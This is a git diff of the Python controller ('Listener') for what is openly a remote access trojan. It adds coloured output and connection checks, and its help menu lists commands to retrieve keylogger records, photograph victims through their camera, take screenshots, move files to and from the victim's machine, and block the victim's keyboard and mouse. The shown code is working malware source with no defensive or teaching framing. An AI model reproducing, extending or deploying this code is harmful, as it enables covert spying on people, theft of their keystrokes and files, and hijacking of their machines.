@@ -25,7 +25,7 @@ class Listener:
 		self.chosen_connection = None
 		self.do_listen = True
 
-		print("[+] Waiting for incoming connections")
+		print(colored("[+] Waiting for incoming connections", "green"))
 
 
 	def listen(self):
@@ -33,7 +33,7 @@ class Listener:
 			try:
 				self.listener.listen(0)
 				connection, address = self.listener.accept()
-				print("\n[+] Got a connection from " + str(address))
+				print(colored("\n[+] Got a connection from " + str(address), "green"))
 				print("# Press Enter")
 				self.connections.append((connection, address))
 				self.listen()
@@ -122,7 +122,7 @@ class Listener:
 					elif int(chosen) <= len(connections):
 						chosen = int(chosen)
 						self.chosen_connection = connections[chosen - 1]
-						print("[+] Chosen connection:", self.chosen_connection[1])
+						print(colored("[+] Chosen connection: " + str(self.chosen_connection[1]), "green"))
 					else:
 						print(colored("[-] This connection does not exist!"))
 				else:
@@ -130,7 +130,7 @@ class Listener:
 
 			elif command == "chosen":
 				if self.chosen_connection:
-					print("[+] Chosen connection:", self.chosen_connection[1])
+					print(colored("[+] Chosen connection: " + str(self.chosen_connection[1]), "green"))
 				else:
 					print(colored("[-] You didn't choose any connection yet", "red"))
 
@@ -139,7 +139,18 @@ class Listener:
 				help_message += colored(" print", "green") + " - show all connections;\n"
 				help_message += colored(" choose", "green") + " - choose connection;\n"
 				help_message += colored(" l ls", "green") + " - execute ls on own machine;\n"
-				help_message += colored(" exit", "red") + " - stop the program; \n"
+				help_message += colored(" get keys", "green") + " - get all records from keylogger;\n"
+				help_message += colored(" camera", "green") + " - Take photo from victim's camera;\n"
+				help_message += colored(" screen", "green") + " - Take screenshot from victim's screen;\n"
+				help_message += colored(" upload <filename>", "green") + " - upload file to victim's machine;\n"
+				help_message += colored(" download <filename>", "green") + " - download file from victim's machine;\n"
+				help_message += colored(" keyboard false", "green") + " - block keyboard;\n"
+				help_message += colored(" keyboard true", "green") + " - unblock keyboard;\n"
+				help_message += colored(" mouse false", "green") + " - block mouse;\n"
+				help_message += colored(" mouse true", "green") + " - unblock mouse;\n"
+				help_message += colored(" play music", "green") + " - play music;\n"
+				help_message += colored(" volume <negative number>", "green") + " - set volume;\n"
+				help_message += colored(" exit", "red") + " - stop the program;\n"
 				print(help_message)
 
 			elif command == "exit":
@@ -194,23 +205,58 @@ class Listener:
 				print(res)
 
 			elif command.strip() and len(command.split()) == 2 and command.split()[0] == "mouse":
-				result = self.execute_remotely(command)
-				if result.split()[0] == "[-]":
-					print(colored(result, "red"))
-				else:
-					print(colored(result, "green"))
+				if self.chosen_connection:
+					result = self.execute_remotely(command)
+					if result.split()[0] == "[-]":
+						print(colored(result, "red"))
+					else:
+						print(colored(result, "green"))
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif command.strip() and len(command.split()) == 2 and command.split()[0] == "keyboard":
-				result = self.execute_remotely(command)
-				if result.split()[0] == "[-]":
-					print(colored(result, "red"))
-				else:
-					print(colored(result, "green"))
-
+				if self.chosen_connection:
+					result = self.execute_remotely(command)
+					if result.split()[0] == "[-]":
+						print(colored(result, "red"))
+					else:
+						print(colored(result, "green"))
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif command == "get keys":
-				res = self.execute_remotely(command)
-				self.write_file("logs.txt", res)
+				if self.chosen_connection:
+					res = self.execute_remotely(command)
+					self.write_file("logs.txt", res)
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
+
+			elif command == "play music":
+				if self.chosen_connection:
+					res = self.execute_remotely(command)
+					if res.split()[0] == "[-]": 
+						print(colored(res, "red"))
+					else:
+						print(colored(res, "green"))
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
+
+			elif command == "stop music":
+				if self.chosen_connection:
+					res = self.execute_remotely(command)
+					if res.split()[0] == "[~]":
+						print(colored(res, "yellow"))
+					else: print(colored(res, "green"))
+
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
+
+			elif command.strip() and command.split()[0] == "volume":
+				if self.chosen_connection:
+					try:
+						float(command.split()[1])
+						res = self.execute_remotely(command)
+						if res.split()[0] == "[+]":
+							print(colored(res, "green"))
+						else:
+							print(colored(res, "red"))
+					except: print(colored("[-] Wrong arugument", "red"))
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 
 			elif len(command.split()):
